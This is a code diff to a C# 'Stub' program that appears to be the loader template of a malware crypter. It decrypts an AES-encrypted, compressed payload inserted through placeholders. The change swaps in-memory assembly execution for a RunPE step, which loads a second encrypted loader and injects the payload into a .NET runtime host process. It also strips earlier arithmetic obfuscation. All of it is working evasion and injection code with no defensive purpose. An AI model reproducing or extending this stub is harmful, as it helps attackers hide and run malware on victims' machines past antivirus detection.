@@ -2,6 +2,7 @@
 using System.IO;
 using System.IO.Compression;
 using System.Reflection;
+using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 
@@ -9,42 +10,53 @@ namespace Stub
 {
     static class Program
     {
-        /// <summary>
-        /// The main entry point for the application.
-        /// </summary>
         [STAThread]
         static void Main()
         {
             string passwordAesCompressStub = "#PASSWORD_AES_COMPRESS_STUB#";
             string payloadAesCompressStub = "#PAYLOAD_AES_COMPRESS_STUB#";
-            Assembly.Load(
-                    Decompress(AES_Decrypt(Convert.FromBase64String(payloadAesCompressStub),
-                        passwordAesCompressStub))).EntryPoint
-                .Invoke(null, null);
+
+            RunPe(Decompress(AES_Decrypt(Convert.FromBase64String(payloadAesCompressStub), passwordAesCompressStub)));
         }
 
-        //Use : Decompress(AES_Decrypt(input,"key"));
-        public static byte[] AES_Decrypt(byte[] payload, string key)
+        private static void RunPe(byte[] data)
         {
-            AesManaged aes256 = new AesManaged();
-            MD5CryptoServiceProvider hashAes = new MD5CryptoServiceProvider();
-            aes256.Key = hashAes.ComputeHash(Encoding.ASCII.GetBytes(key));
-            aes256.Mode = CipherMode.ECB;
-            byte[] decrypt = aes256.CreateDecryptor().TransformFinalBlock(payload, 50 - 50, payload.Length);
-            return decrypt;
+            string codeRunPe = "#CodeRunPE#";
+            string passwordRunPe = "#PasswordRunPE#";
+            string pathProcess = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "#PathProcess#");
+
+            Assembly runpeLoader = Assembly.Load(Decompress(AES_Decrypt(Convert.FromBase64String(codeRunPe), passwordRunPe)));
+
+            MethodInfo mi = runpeLoader.GetType("#NamespaceRunpe#.#ClassRunpe#").GetMethod("#MethodsRunPE#");
+            object[] parameters = { pathProcess, data };
+            mi.Invoke(null, parameters);
         }
 
-
-        public static byte[] Decompress(byte[] decompressData)
+        private static byte[] AES_Decrypt(byte[] payload, string key)
         {
-            MemoryStream decompressMemoryStream = new MemoryStream();
-            IntPtr decompressLength = (IntPtr)BitConverter.ToInt32(decompressData, 200 - 50 * 4);
-            decompressMemoryStream.Write(decompressData, 4 * 1, decompressData.Length - 8 / 2);
-            byte[] decompressBuffer = new byte[(int)decompressLength];
-            decompressMemoryStream.Position = 700 + 300 - 100 * 10;
-            GZipStream decompressZip = new GZipStream(decompressMemoryStream, CompressionMode.Decompress);
-            int read = decompressZip.Read(decompressBuffer, 100 - 50 * 2, decompressBuffer.Length);
-            return decompressBuffer;
+            using (AesManaged aes256 = new AesManaged())
+            using (MD5CryptoServiceProvider hashAes = new MD5CryptoServiceProvider())
+            {
+                aes256.Key = hashAes.ComputeHash(Encoding.ASCII.GetBytes(key));
+                aes256.Mode = CipherMode.ECB;
+                return aes256.CreateDecryptor().TransformFinalBlock(payload, 0, payload.Length);
+            }
+        }
+
+        private static byte[] Decompress(byte[] decompressData)
+        {
+            using (MemoryStream decompressMemoryStream = new MemoryStream())
+            {
+                int decompressLength = BitConverter.ToInt32(decompressData, 0);
+                decompressMemoryStream.Write(decompressData, 4, decompressData.Length - 4);
+                byte[] decompressBuffer = new byte[decompressLength];
+                decompressMemoryStream.Position = 0;
+                using (GZipStream decompressZip = new GZipStream(decompressMemoryStream, CompressionMode.Decompress))
+                {
+                    decompressZip.Read(decompressBuffer, 0, decompressBuffer.Length);
+                }
+                return decompressBuffer;
+            }
         }
     }
 }
